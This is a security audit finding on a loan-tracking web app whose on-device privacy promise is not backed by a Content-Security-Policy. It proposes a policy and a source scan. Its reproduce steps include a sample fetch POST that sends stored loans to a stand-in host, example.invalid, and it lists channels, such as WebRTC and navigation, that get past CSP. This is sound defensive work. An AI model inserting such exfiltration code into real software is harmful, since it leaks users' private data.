# SEC-01: Privacy promise is not enforced by a CSP

**P2** · effort S · Security, privacy and best practices

Nothing enforces the "Stays on this device" promise: the site sends no Content-Security-Policy and node verify.mjs never scans the UI code, so one added analytics line or dependency could send every borrower's saved loans off the device without any check failing.

| | |
|---|---|
| Who it hurts | A borrower has only the author's word that their loans stay on the device: one analytics snippet added by a coding agent or one bad dependency update could post every saved loan elsewhere, the browser would not object, and every check would stay green. |
| Standard | CSP Level 3 (W3C), whose non-normative section 8.6 says CSP can mitigate exfiltration when default-src is set, and the OWASP Secure Headers Project; both recommend rather than require a policy. The binding commitment is the product's own: 'Nothing you enter is transmitted anywhere' (src/data/plans.ts:285) and the 'Stays on this device' badge (src/app/page.tsx:337-338). |
| Where | Every response from https://cense-loan-desk.vercel.app/ (the document, the 404, /icon.svg and the script chunks), in every state and at every viewport; and the test harness, which compiles only the calc, ranking, plans and types modules (verify.mjs:49-54) and so never reads layout.tsx, page.tsx or storage.ts. |
| Code | [`next.config.mjs:2`](../../next.config.mjs#L2), [`src/data/plans.ts:284-285`](../../src/data/plans.ts#L284-L285), [`src/app/page.tsx:337-338`](../../src/app/page.tsx#L337-L338), [`src/app/page.tsx:841`](../../src/app/page.tsx#L841), [`src/lib/storage.ts:30`](../../src/lib/storage.ts#L30), [`verify.mjs:49-54`](../../verify.mjs#L49-L54), [`verify.mjs:626`](../../verify.mjs#L626), [`package.json:11-19`](../../package.json#L11-L19) |
| Test | `security-privacy.spec.mjs`: "SEC-01 no page on this site can send a borrower's saved loans to another site" |
| Fix proof | Not attempted: fix proofs were run for P0 and P1 only. |

## Measured

Live: curl -sI on /, all 8 linked JS and CSS assets and /icon.svg returns no Content-Security-Policy. The lab scanner labels this critical; that label is inflated, because src has 0 dangerouslySetInnerHTML, innerHTML, eval or next/script, there is no third-party script, and hostile loan text renders as text. With no policy, 9 of 9 channels tried from inside the page (fetch, XHR, sendBeacon, WebSocket, EventSource, image, stylesheet, external script, form post) carried stored loan data to a local echo server and eval ran, in Chrome 146 and in macOS WebKit. With the policy in the fix on every response: 0 of 9 arrived in either engine, eval threw EvalError, the script src and innerHTML sinks threw TypeError, and fetch from a same-origin popup on /no-such-page or /icon.svg was rejected. The filed version put the policy on / only; those popups read the stored loans (1,623 characters in one run) and their fetch reached the echo. What no CSP stops, measured under every policy tried: a top-level navigation (location.href, a meta refresh, an attachment link) reached the echo; a WebRTC TURN/STUN entry sent localStorage data over UDP with 0 violations in both engines (53 packets in one Chromium run), and a webrtc 'block' directive is ignored by both; preconnect opened a TCP connection with no HTTP request. Journey with the fix (next build plus next start at 1280 and 375: add two loans, hide amounts, both spreadsheet exports, print, all four tabs, reload): 0 console messages, 0 page errors, 0 violations, 0 offsite requests, 2 valid downloads (18,191 and 22,225 bytes), and a clean 404; in WebKit it hydrates with 2 fonts, 0 violations and 2 files saved. Rejected policies: script-src 'self' leaves the page on the loading skeleton with 5 inline-script violations; sha256 hashes change between builds; nonces need per-request rendering. Harness: a POST of the store on every save (after src/lib/storage.ts:30) and a Google Tag Manager script in the layout each still pass node verify.mjs 180 of 180, and tsc and next build exit 0 (next lint is silent on fetch and only warns on the GTM tag). Today's source is clean: 0 matches for fetch, XMLHttpRequest, sendBeacon, WebSocket, EventSource or gtag in src, and every journey on :3100 made 11 to 14 requests with 0 off-origin and 0 non-GET. The filed regex guard kills both mutants but passes next/script, @vercel/analytics, @vercel/speed-insights, a new Image() pixel, a third-party font link and a third-party img; the scan in the fix passes today's source and fails all 7 of those shapes.

## Required

A Content-Security-Policy on every response from this origin that refuses fetch, XHR, beacon, WebSocket, EventSource, form posts and third-party subresources, with 0 violations across the real journey, described as a guard rail because CSP cannot stop navigation, WebRTC or preconnect. Plus a check in node verify.mjs that fails when src gains a network API, a third-party script or an off-site URL, or package.json gains a runtime dependency.

## Reproduce

1. Run curl -sI https://cense-loan-desk.vercel.app/ : there is no content-security-policy line (Strict-Transport-Security is the only security header).
2. Open http://localhost:3100, click 'Look around with example loans', open the DevTools Console and run fetch('https://example.invalid/'). Today the console shows only a name-resolution error, so the page was allowed to try; with the fix it prints 'Refused to connect' naming connect-src 'none' and fires a securitypolicyviolation event. The .invalid domain never resolves, so nothing leaves the machine.
3. In a scratch copy of the repo, add fetch("https://example.invalid/collect", { method: "POST", body: JSON.stringify(value) }); after src/lib/storage.ts:30 and run node verify.mjs: it still ends PASS 180 FAIL 0, because verify.mjs:49-54 compiles only calc, ranking, plans and types.

Or run its test from `audits/`: `AUDIT_SHOW_KNOWN=1 npx playwright test -g "SEC-01"`.

## Fix

Two small layers: the browser refuses the ordinary network channels, and the harness stops such a change before it ships.

1) next.config.mjs:2, replacing the empty config. This policy and header set were tested on next build plus next start at 1280 and 375 and in macOS WebKit, not yet on Vercel or an iPhone:

/** @type {import('next').NextConfig} */

// Refuses fetch, XHR, beacon, WebSocket, EventSource, form posts and third-party
// subresources on every document on this origin. It cannot stop a top-level
// navigation, WebRTC or preconnect, so it is a guard rail, not a guarantee.
const csp = [
  "default-src 'none'",
  // Next's inline bootstrap: a nonce needs per-request rendering, a hash changes every build.
  "script-src 'self' 'unsafe-inline'",
  // Next's default 404 uses inline styles, and this policy covers every document.
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self'",
  "font-src 'self'",
  "connect-src 'none'",
  "base-uri 'none'",
  "form-action 'none'",
  "frame-ancestors 'none'",
  "require-trusted-types-for 'script'",
  "trusted-types nextjs nextjs#bundler",
].join("; ");

const nextConfig = {
  poweredByHeader: false,
  images: { unoptimized: true },
  async headers() {
    // next dev needs eval and a websocket for hot reload.
    if (process.env.NODE_ENV !== "production") return [];
    return [{
      // Every path, not only /: localStorage belongs to the whole origin, so a page left
      // without a policy (the 404, /icon.svg) could be opened in a popup and used to send.
      source: "/(.*)",
      headers: [
        { key: "Content-Security-Policy", value: csp },
        { key: "X-Content-Type-Options", value: "nosniff" },
        { key: "X-Frame-Options", value: "DENY" },
        { key: "Referrer-Policy", value: "no-referrer" },
        { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=(), usb=()" },
        { key: "Cross-Origin-Opener-Policy", value: "same-origin" },
      ],
    }];
  },
};
export default nextConfig;

The last five headers are SEC-03 and ride in the same rule. Under SEC-02's static export, headers() is ignored and the same rule goes in vercel.json.

2) verify.mjs, a new block just before the report at line 626 (readFileSync is imported at line 23, readdirSync at line 59):

// The privacy promise: no network API, third-party script or off-site URL in src,
// and no runtime dependency beyond today's seven.
{
  const FORBIDDEN = /\b(fetch|XMLHttpRequest|sendBeacon|WebSocket|EventSource)\b|googletagmanager|gtag\(|<script[^>]*\ssrc=|next\/script|next\/third-parties|new Image\b/i;
  const OFF_SITE = /https?:\/\/(?!(?:studentaid\.gov|cense\.beehiiv\.com)\b)/;
  const walk = (d) => readdirSync(d, { withFileTypes: true }).flatMap((f) =>
    f.isDirectory() ? walk(`${d}/${f.name}`) : /\.tsx?$/.test(f.name) ? [`${d}/${f.name}`] : []);
  const hits = walk("src").filter((f) => { const t = readFileSync(f, "utf8"); return FORBIDDEN.test(t) || OFF_SITE.test(t); });
  ok("no network API, third-party script or off-site URL in src", hits.length === 0, hits.join(", "));
  const ALLOWED = ["clsx", "framer-motion", "next", "react", "react-dom", "tailwind-merge", "xlsx"];
  const extra = Object.keys(JSON.parse(readFileSync("package.json", "utf8")).dependencies).filter((d) => !ALLOWED.includes(d));
  ok("no new runtime dependency", extra.length === 0, extra.join(", "));
}

Measured on a scratch copy: today's source passes, and a fetch POST on save, a Google Tag Manager script, next/script, @vercel/analytics, a new Image() pixel, a third-party font link and a third-party img each make it exit 1. If you remove framer-motion (README.md:199-200 says it is no longer imported), drop it from ALLOWED too.

## Severity

Every borrower on every visit is shown 'Stays on this device', and only manual review backs it today: with no policy all 9 ordinary network channels can carry saved loans off the device, and verify.mjs still passes 180 of 180 with a POST of every save added. No data leaves today, so nothing on screen is wrong, but leaving the product's central promise unenforced is a meaningful missed opportunity rather than polish.

## Verification

Confirmed by 4 of 4 skeptics across the 2 findings (standards and reproduce on each); 3 kept P2, 1 rated P3.

<details><summary>Dissent and notes</summary>

Severity: the standards skeptic on the missing check (agentic-privacy-promise-unguarded) rated it P3, because the shipped code is clean and nothing in the stance requires an automated check, so it is hardening; the other three kept P2. Scope: both CSP skeptics rejected the filed title and required line ('a tested CSP does' enforce the promise, 'refuses every outbound connection'), because navigation, WebRTC and preconnect still leave under any policy in Chromium and WebKit, and the filed policy on / alone left a popup route through /no-such-page, /icon.svg and chunk URLs, which carried no policy but share localStorage. They also rejected two filed code comments as false: 'may not open a network connection of any kind' and 'Only the document that can see the data'. Fix shape: the standards skeptic tested two policies (style-src 'self' plus Trusted Types on /, a relaxed one on /:path+); the reproduce skeptic tested one policy on /(.*). Both skeptics on the missing check rejected the filed regex as case-sensitive and too narrow: it passes next/script, @vercel/analytics, @vercel/speed-insights, a new Image() pixel, a third-party font link and a third-party img. Hash count: the filing said 3 of the 5 inline scripts change hash per build; the skeptics measured 1 or 2 of 5 between rebuilds of identical source and 2 to 3 of 5 after a source change. The conclusion that hashes are impractical stands.

Why one policy on /(.*): it is a single string, it closes the popup route, it was tested in Chromium and WebKit including the 404, and it is the same rule SEC-02's vercel.json uses, so nothing changes if you adopt static export. The two-policy variant keeps style-src 'self' on / at the cost of a second string to maintain; inline styles add little risk on / because img-src and font-src 'self' stop CSS from loading anything off-site and Trusted Types guards the DOM sinks. Why both layers: the policy protects borrowers in the browser; the verify.mjs scan stops the change before it ships and also catches @vercel/analytics, whose same-origin /_vercel/ endpoints an off-origin request check would miss (connect-src 'none' refuses those too). The scan walks .ts and .tsx files only, because src/app/icon.svg carries an xmlns URL. The filing said 'npm test'; the repo has no test script, so the check lives in node verify.mjs, which README.md:90 documents. Cautions from the members: do not add report-uri or report-to, because a CSP report is itself a network request the privacy note says does not exist; do not add webrtc 'block', which neither engine honoured; on Next 16 with Turbopack the two Trusted Types lines make both spreadsheet downloads silently produce no file, so drop them there or build with next build --webpack (SEC-02); under static export headers() is ignored, so the same rule goes in vercel.json (SEC-02). Nobody deployed this: check a Vercel preview with curl -sI and a real iPhone before production. Keep README.md:79-81 and any copy to what the policy does: it refuses the ordinary network APIs; it does not make leaving impossible. Rejected by test: script-src 'self' strands the page on the loading skeleton; hashes break because inline scripts change between builds and headers() runs before the output exists; nonces need per-request rendering and would make GHSA-ffhc-5mcf-pf4q reachable on 14.x. The repo has no browser test today; if one is added, the standards skeptic suggests failing on any non-GET request and any /_vercel/ path as well (not run). The scanner's 'critical' label is inflated: src has no DOM sinks and no third-party script.

</details>

Merged from audit findings: `bp-csp-privacy-not-enforced`, `agentic-privacy-promise-unguarded`.
